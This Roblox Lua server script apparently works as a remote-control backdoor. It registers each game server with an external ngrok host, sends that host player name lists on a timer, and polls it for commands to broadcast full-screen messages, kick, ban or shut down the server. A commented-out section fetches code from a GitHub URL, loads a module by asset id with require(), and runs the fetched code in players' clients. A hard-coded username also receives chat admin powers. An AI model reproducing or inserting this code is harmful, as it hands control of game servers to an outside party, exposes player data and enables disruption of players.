

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local COMMAND_URL = "https://vecxoremoteapi.ngrok.pro/latest-command"
local REGISTER_URL = "https://vecxoremoteapi.ngrok.pro/register-server"
local REPORT_URL = "https://vecxoremoteapi.ngrok.pro/report-players"

local banned = {}
local serverId = game.JobId
local serverLabel = "unknown"

task.spawn(function()
	while true do
		local success, res = pcall(function()
			return HttpService:PostAsync(
				REGISTER_URL,
				HttpService:JSONEncode({ serverId = serverId }),
				Enum.HttpContentType.ApplicationJson
			)
		end)
		if success then
			local data = HttpService:JSONDecode(res)
			if data and data.label then
				serverLabel = data.label
			end
		end
		task.wait(10)
	end
end)

local function runCommand(cmd)
	if not cmd or not cmd.text then return end

	local sender = cmd.sender or "Err"
	local text = cmd.text:lower()

	print("[COMMAND RECEIVED] From:", sender, "| Command:", text)

	if text:sub(1, 2) == "m " then
		local msg = cmd.text:sub(3)
		for _, player in pairs(Players:GetPlayers()) do
			task.spawn(function()
				local gui = Instance.new("ScreenGui")
				gui.Name = "FullScreenAnnouncement"
				gui.ResetOnSpawn = false
				gui.IgnoreGuiInset = true
				gui.Parent = player:FindFirstChildOfClass("PlayerGui")

				local bg = Instance.new("Frame")
				bg.Size = UDim2.new(1, 0, 1, 0)
				bg.Position = UDim2.new(0, 0, 0, 0)
				bg.BackgroundColor3 = Color3.new(0, 0, 0)
				bg.BackgroundTransparency = 1 -- starts invisible
				bg.Parent = gui

				local container = Instance.new("Frame")
				container.Size = UDim2.new(1, -100, 0, 180) -- increased height for 3 lines
				container.Position = UDim2.new(0.5, 0, 0.5, 0)
				container.AnchorPoint = Vector2.new(0.5, 0.5)
				container.BackgroundTransparency = 1
				container.Parent = bg

				local titleLabel = Instance.new("TextLabel")
				titleLabel.Size = UDim2.new(1, 0, 0, 40)
				titleLabel.Position = UDim2.new(0, 0, 0, 0)
				titleLabel.BackgroundTransparency = 1
				titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				titleLabel.TextStrokeTransparency = 0.4
				titleLabel.Font = Enum.Font.Code
				titleLabel.TextScaled = true
				titleLabel.Text = "[Vecxo Remote API]:"
				titleLabel.Parent = container

				local senderLabel = Instance.new("TextLabel")
				senderLabel.Size = UDim2.new(1, 0, 0, 40)
				senderLabel.Position = UDim2.new(0, 0, 0, 40)
				senderLabel.BackgroundTransparency = 1
				senderLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
				senderLabel.TextStrokeTransparency = 0.6
				senderLabel.Font = Enum.Font.Code
				senderLabel.TextScaled = true
				senderLabel.Text = `{sender}`
				senderLabel.Parent = container

				local messageLabel = Instance.new("TextLabel")
				messageLabel.Size = UDim2.new(1, 0, 0, 90)
				messageLabel.Position = UDim2.new(0, 0, 0, 80)
				messageLabel.BackgroundTransparency = 1
				messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				messageLabel.TextStrokeTransparency = 0.4
				messageLabel.Text = ""
				messageLabel.Font = Enum.Font.Code
				messageLabel.TextScaled = true
				messageLabel.TextWrapped = true
				messageLabel.Parent = container

				local tweenService = game:GetService("TweenService")


				local fadeIn = tweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 0.4 })
				fadeIn:Play()
				fadeIn.Completed:Wait()

				local fullText = `{msg}`
				for i = 1, #fullText do
					messageLabel.Text = string.sub(fullText, 1, i)
					task.wait(0.025)
				end

				task.delay(5, function()
					local fadeOutBg = tweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 1 })
					local fadeOutMessage = tweenService:Create(messageLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					local fadeOutTitle = tweenService:Create(titleLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					local fadeOutSender = tweenService:Create(senderLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					fadeOutBg:Play()
					fadeOutMessage:Play()
					fadeOutTitle:Play()
					fadeOutSender:Play()
					fadeOutBg.Completed:Wait()
					gui:Destroy()
				end)
			end)
		end
	end

--[[	local TextChatService = game:GetService("TextChatService")
	local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")

	if text:sub(1, 5) == "chat " then
		local msg = text:sub(6)
		local HttpService = game:GetService("HttpService")
		local code
		local success, err = pcall(function()
			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/RoChatAPI")
		end)

		if not success then
			warn'http failed with chat api'
			return
		end

		local formattedMessage = `{sender}: {msg}`
		code = code:gsub('%[Vecko%]: asd', formattedMessage)

		for i, plr in pairs(game.Players:GetPlayers()) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end
			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
			if not goog then
				warn("goog failed to be added, command cannot continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code
			if plr.Character then
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
		end
	end ]]

	if text:sub(1, 2) == "h " then
		local msg = cmd.text:sub(3)
		for _, player in pairs(Players:GetPlayers()) do
			task.spawn(function()
				local gui = Instance.new("ScreenGui")
				gui.Name = "RemoteAnnouncement"
				gui.ResetOnSpawn = false
				gui.IgnoreGuiInset = true
				gui.Parent = player:FindFirstChildOfClass("PlayerGui")
				local label = Instance.new("TextLabel")
				label.Size = UDim2.new(1, 0, 0, 40)
				label.Position = UDim2.new(0, 0, -0.1, 0)
				label.BackgroundTransparency = 0.3
				label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				label.TextColor3 = Color3.fromRGB(255, 255, 255)
				label.TextStrokeTransparency = 0.5
				label.Font = Enum.Font.Ubuntu
				label.TextScaled = true
				label.Text = ""
				label.Parent = gui
				local tweenService = game:GetService("TweenService")
				local tweenIn = tweenService:Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Position = UDim2.new(0, 0, 0, 0)
				})
				tweenIn:Play()
				tweenIn.Completed:Wait()
				local fullText = `[Vecxo Remote API] - {sender}: {msg}`
				for i = 1, #fullText do
					label.Text = string.sub(fullText, 1, i)
					task.wait(0.04)
				end
				task.delay(5, function()
					local tweenOut = tweenService:Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
						Position = UDim2.new(0, 0, -0.1, 0)
					})
					tweenOut:Play()
					tweenOut.Completed:Wait()
					gui:Destroy()
				end)
			end)
		end
	end

	if text:sub(1, 5) == "kick " then
		local target = text:sub(6):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if p.Name:lower():sub(1, #target) == target then
				p:Kick(`[Vecxo Remote API] Kicked by {sender}`)
				break
			end
		end
	end

	if text:sub(1, 4) == "ban " then
		local target = text:sub(5):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if p.Name:lower():sub(1, #target) == target then
				table.insert(banned, p.Name)
				p:Kick(`[Vecxo Remote API] Banned by {sender}`)
				break
			end
		end
	end

	if text:sub(1, 9) == "shutdown " then
		for _, p in pairs(Players:GetPlayers()) do
			p:Kick(`[Vecxo Remote API] Shutdown by {sender}`)
		end
		game:Shutdown()
	end
end


Players.PlayerAdded:Connect(function(player)
	if table.find(banned, player.Name) then
		player:Kick("[Vecxo Remote API] You were remotely banned from the server.")
	end
end)

task.spawn(function()
	while true do
		task.wait(20)
		local playerNames = {}
		for _, player in ipairs(Players:GetPlayers()) do
			table.insert(playerNames, player.Name)
		end
		local success, err = pcall(function()
			HttpService:PostAsync(
				REPORT_URL,
				HttpService:JSONEncode({
					serverId = serverId,
					players = playerNames
				}),
				Enum.HttpContentType.ApplicationJson
			)
		end)
		if not success then
			warn("[Vecxo Remote API] Failed to auto-report players:", err)
		end
	end
end)

task.spawn(function()
	while true do
		task.wait(1.5)
		local success, response = pcall(function()
			local url = COMMAND_URL .. "?serverId=" .. HttpService:UrlEncode(serverId)
			return HttpService:GetAsync(url)
		end)
		if success then
			local data = HttpService:JSONDecode(response)
			if data and data.command then
				runCommand(data.command)
			end
		else
			warn("Command fetch failed:", response)
		end
	end
end)

coroutine.wrap(function()
	local h = Instance.new('Hint', workspace)
	h.Text = '[Vecxo Remote API] - Connected successfully'
	task.wait(3)
	h:Destroy()
end)

--//VECXO LITE STARTS HERE

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local whitelisted = {
	["Reloxz"] = true,
}

local bannedPlayers = {}

local TweenService = game:GetService("TweenService")

local function notify(player, title, message)
	local gui = Instance.new("ScreenGui")
	gui.Name = "AdminNotification"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Parent = player:FindFirstChildOfClass("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0.4, 0, 0.2, 0)
	frame.Position = UDim2.new(0.5, 0, 0.1, 0)
	frame.AnchorPoint = Vector2.new(0.5, 0)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.Parent = gui

	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
	titleLabel.Position = UDim2.new(0, 0, 0, 0)
	titleLabel.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	titleLabel.TextStrokeTransparency = 1
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.Font = Enum.Font.Code
	titleLabel.TextScaled = true
	titleLabel.Text = title
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, 0, 0.7, 0)
	messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
	messageLabel.BackgroundTransparency = 1
	messageLabel.TextTransparency = 1
	messageLabel.TextStrokeTransparency = 1
	messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
	messageLabel.Font = Enum.Font.Code
	messageLabel.TextScaled = true
	messageLabel.TextWrapped = true
	messageLabel.Text = message
	messageLabel.Parent = frame

	local fadeInTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	TweenService:Create(frame, fadeInTweenInfo, { BackgroundTransparency = 0.2 }):Play()
	TweenService:Create(titleLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
	TweenService:Create(messageLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()

	task.delay(5, function()
		local fadeOutTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		TweenService:Create(frame, fadeOutTweenInfo, { BackgroundTransparency = 1 }):Play()
		TweenService:Create(titleLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
		TweenService:Create(messageLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
		task.wait(0.5)
		gui:Destroy()
	end)
end


local function processCommand(sender, msg)
	if not whitelisted[sender.Name] then return end
	local args = msg:split(" ")
	local cmd = args[1]:lower()

	if cmd == "!cmds" then
		notify(sender, "[Vecxo Lite]", "!kick <plr> [reason]\n!ban <plr> [reason]\n!h <message>")
	elseif cmd == "!kick" and args[2] then
		local targetName = args[2]:lower()
		local reason = msg:match("^!kick%s+%S+%s+(.+)$") 
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr.Name:lower():sub(1, #targetName) == targetName then
				if reason then
					plr:Kick("[Vecxo Lite]: Kicked by " .. sender.Name .. ": " .. reason)
					notify(sender, "Kick", "Kicked " .. plr.Name)
				else
					plr:Destroy()
					notify(sender, "Kick", "Forcefully destroyed " .. plr.Name)
				end
				return
			end
		end
	elseif cmd == "!ban" and args[2] then
		local targetName = args[2]:lower()
		local reason = msg:match("^!ban%s+%S+%s+(.+)$")

		for _, plr in ipairs(Players:GetPlayers()) do
			if plr.Name:lower():sub(1, #targetName) == targetName then
				bannedPlayers[plr.UserId] = true
				if reason then
					plr:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
					notify(sender, "Ban", "Banned " .. plr.Name)
				else
					plr:Destroy()
					notify(sender, "Ban", "Forcefully destroyed (banned) " .. plr.Name)
				end
				return
			end
		end

	elseif cmd == "!h" then
		local announcement = msg:sub(4)
		for _, plr in ipairs(Players:GetPlayers()) do
			notify(plr, "[Vecxo Lite]", announcement)
		end
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	if whitelisted[player.Name] then
		notify(player, "You're whitelisted!", "Usage: !cmds")
	end
	player.Chatted:Connect(function(message)
		processCommand(player, message)
	end)
end

Players.PlayerAdded:Connect(function(player)
	if bannedPlayers[player.UserId] then
		player:Kick("[Admin] You are banned from this server.")
		return
	end
	if whitelisted[player.Name] then
		notify(player, "You're whitelisted!", "Usage: !cmds")
	end
	player.Chatted:Connect(function(message)
		processCommand(player, message)
	end)
end)

